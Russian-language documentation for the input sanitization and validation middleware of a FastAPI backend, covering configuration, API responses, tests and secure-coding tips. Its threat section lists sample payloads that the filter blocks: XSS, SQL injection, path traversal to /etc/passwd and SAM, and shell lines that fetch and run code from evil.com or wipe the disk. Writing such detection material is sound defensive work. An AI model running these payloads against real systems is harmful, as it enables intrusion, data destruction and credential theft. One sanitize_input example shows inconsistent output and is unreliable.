# Валидация и санитизация входных данных

## Обзор

PAD+ AI реализует комплексную систему валидации и санитизации всех входящих API запросов для защиты от:

- **XSS (Cross-Site Scripting)** - внедрение вредоносных скриптов
- **SQL Injection** - внедрение вредоносных SQL запросов
- **Command Injection** - внедрение системных команд
- **Path Traversal** - доступ к файлам вне корневой директории
- **Чрезмерно больших запросов** - защита от DoS атак

## Архитектура

```
┌─────────────────────────────────────────────────────────────────┐
│                         HTTP Request                             │
└─────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│                   ValidationMiddleware                           │
│  ┌─────────────────────────────────────────────────────────────┐│
│  │  1. Проверка размера тела запроса                           ││
│  │  2. Санitизация query параметров                            ││
│  │  3. Санitизация JSON тела                                   ││
│  │  4. Проверка на угрозы (XSS, SQLi, CmdI, PathTr)           ││
│  │  5. Блокировка опасных запросов                             ││
│  └─────────────────────────────────────────────────────────────┘│
└─────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│                     InputSanitizer                               │
│  ┌─────────────────────────────────────────────────────────────┐│
│  │  • HTML экранирование                                       ││
│  │  • Unicode нормализация                                     ││
│  │  • Удаление управляющих символов                            ││
│  │  • Проверка паттернов атак                                  ││
│  └─────────────────────────────────────────────────────────────┘│
└─────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│                      API Handler                                 │
└─────────────────────────────────────────────────────────────────┘
```

## Компоненты

### 1. InputSanitizer (`backend/core/input_sanitizer.py`)

Основной модуль санитизации с защитой от различных типов атак.

```python
from core.input_sanitizer import sanitize_input, validate_input

# Быстрая санитизация
clean_text = sanitize_input(user_input)

# Валидация с проверкой
is_safe, sanitized, warnings = validate_input(user_input, max_length=1000)
```

### 2. ValidationMiddleware (`backend/core/validation_middleware.py`)

FastAPI middleware для автоматической обработки всех запросов.

```python
from core.validation_middleware import ValidationMiddleware

app.add_middleware(
    ValidationMiddleware,
    max_body_length=100000,  # 100KB
    max_query_length=1000,   # 1KB
    block_threats=True
)
```

## Использование

### Базовая санитизация

```python
from core.input_sanitizer import sanitize_input

# Санitизация текста
text = "<script>alert('xss')</script>Hello"
clean = sanitize_input(text)
print(clean)  # <script>alert(&#x27;xss&#x27;)</script>Hello

# Санitизация с контекстом
text = "user'; DROP TABLE users--"
clean = sanitize_input(text, context="sql")  # Будет обнаружена SQL инъекция
```

### Валидация с проверкой

```python
from core.input_sanitizer import validate_input

text = "'; DROP TABLE users--"
is_safe, sanitized, warnings = validate_input(text, context="sql")

print(f"Безопасно: {is_safe}")  # False
print(f"Предупреждения: {warnings}")  # ['Обнаружен опасный паттерн...']
```

### Валидация email

```python
from core.input_sanitizer import get_sanitizer

sanitizer = get_sanitizer()
is_valid, email = sanitizer.sanitize_email("User@Example.COM")

print(is_valid)  # True
print(email)     # user@example.com
```

### Настройка лимитов

```python
from core.input_sanitizer import InputSanitizer

# Санitизатор с кастомными лимитами
sanitizer = InputSanitizer(
    max_length=5000,      # Макс. длина ввода
    allow_html=False,     # Запретить HTML
    strict_mode=True      # Строгий режим
)

result = sanitizer.sanitize(user_input)
```

## Типы угроз

### XSS (Cross-Site Scripting)

Обнаруживает и блокирует:

```html
<!-- Script теги -->
<script>alert('xss')</script>
<script src="evil.js"></script>

<!-- Обработчики событий -->
<img src=x onerror=alert('xss')>
<body onload=alert('xss')>

<!-- JavaScript URL -->
<a href="javascript:alert('xss')">click</a>
javascript:alert('xss')

<!-- SVG/Math XSS -->
<svg onload=alert('xss')>
```

### SQL Injection

Обнаруживает и блокирует:

```sql
-- Классические инъекции
' OR '1'='1
" OR "1"="1
admin'--

-- UNION инъекции
UNION SELECT * FROM users
' UNION SELECT null, username, password FROM users--

-- Blind инъекции
'; WAITFOR DELAY '0:0:5'--
1 AND SLEEP(5)
```

### Command Injection

Обнаруживает и блокирует:

```bash
# Конвейеры
; rm -rf /
| cat /etc/passwd

# Subshell
$(curl evil.com/shell.sh | bash)
`ls -la`

# Логические операторы
&& wget evil.com/malware
|| echo "pwned"
```

### Path Traversal

Обнаруживает и блокирует:

```
../../../etc/passwd
..\\..\\..\\windows\\system32\\config\\sam
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

## Конфигурация middleware

### Параметры

| Параметр | По умолчанию | Описание |
|----------|--------------|----------|
| `max_body_length` | 100000 | Макс. размер тела запроса (байт) |
| `max_query_length` | 1000 | Макс. длина query параметра |
| `sanitize_headers` | False | Санitизировать заголовки |
| `block_threats` | True | Блокировать запросы с угрозами |
| `exclude_paths` | [/metrics, /health, ...] | Исключенные пути |

### Пример настройки

```python
app.add_middleware(
    ValidationMiddleware,
    max_body_length=50000,      # 50KB
    max_query_length=500,       # 500 символов
    block_threats=True,
    exclude_paths=[
        "/metrics",
        "/health",
        "/docs",
        "/openapi.json",
    ]
)
```

## Ответы API

### Успешный запрос

```json
{
    "status": "success",
    "data": { ... }
}
```

### Превышен размер запроса (413)

```json
{
    "error": "payload_too_large",
    "message": "Размер запроса превышает лимит (100000 байт)",
    "detail": "The request payload is too large"
}
```

### Обнаружены угрозы (400)

```json
{
    "error": "threat_detected",
    "message": "Запрос содержит потенциально опасные данные",
    "threats_detected": 2,
    "detail": "Request contains potentially dangerous data"
}
```

## Логи безопасности

Все подозрительные запросы логируются:

```
🛡️ Sanitizer: Обнаружены угрозы (high) - угроз: 1, текст: <script>alert('xss')...
🛡️ ValidationMiddleware: Превышен размер тела запроса: 200000 > 100000, path: /api/v1/chat
🛡️ ValidationMiddleware: Обнаружены угрозы в запросе: /api/v1/chat, угроз: 2
```

## Тестирование

### Запуск тестов

```bash
# Все тесты санитизатора
pytest tests/hardening/test_input_sanitizer.py -v

# Конкретный тест
pytest tests/hardening/test_input_sanitizer.py::TestInputSanitizer::test_xss_script_tag -v
```

### Покрытие тестов

- ✅ XSS защита (script теги, event handlers, javascript: URL)
- ✅ SQL Injection защита (классические, UNION, blind)
- ✅ Command Injection защита
- ✅ Path Traversal защита
- ✅ Ограничение длины
- ✅ Unicode нормализация
- ✅ Удаление управляющих символов
- ✅ Валидация email
- ✅ Граничные случаи

## Best Practices

### 1. Всегда используйте параметризованные запросы

```python
# ❌ ПЛОХО - уязвимо к SQL Injection
query = f"SELECT * FROM users WHERE id = {user_id}"

# ✅ ХОРОШО - параметризованный запрос
query = "SELECT * FROM users WHERE id = :user_id"
```

### 2. Экранируйте вывод

```python
# ❌ ПЛОХО
html = f"<p>{user_input}</p>"

# ✅ ХОРОШО
from markupsafe import escape
html = f"<p>{escape(user_input)}</p>"
```

### 3. Валидируйте на клиенте и сервере

```python
# Клиентская валидация (для UX)
if not email_pattern.match(email):
    show_error("Invalid email")

# Серверная валидация (для безопасности)
is_valid, email = sanitizer.sanitize_email(email)
if not is_valid:
    raise HTTPException(400, "Invalid email")
```

### 4. Ограничивайте размер ввода

```python
# ✅ Установите разумные лимиты
class ChatRequest(BaseModel):
    message: str = Field(..., max_length=5000)
```

### 5. Логируйте подозрительные запросы

```python
logger.warning(
    f"Подозрительный запрос от {client_ip}: {threat_type}",
    extra={"ip": client_ip, "path": path}
)
```

## Ограничения

1. **Не является заменой WAF** - используйте дополнительный уровень защиты
2. **Ложные срабатывания** - некоторые легитимные запросы могут блокироваться
3. **Производительность** - проверка добавляет небольшую задержку
4. **Не все паттерны** - злоумышленники постоянно находят новые способы атак

## Дополнительные ресурсы

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [Python Security](https://docs.python.org/3/library/security.html)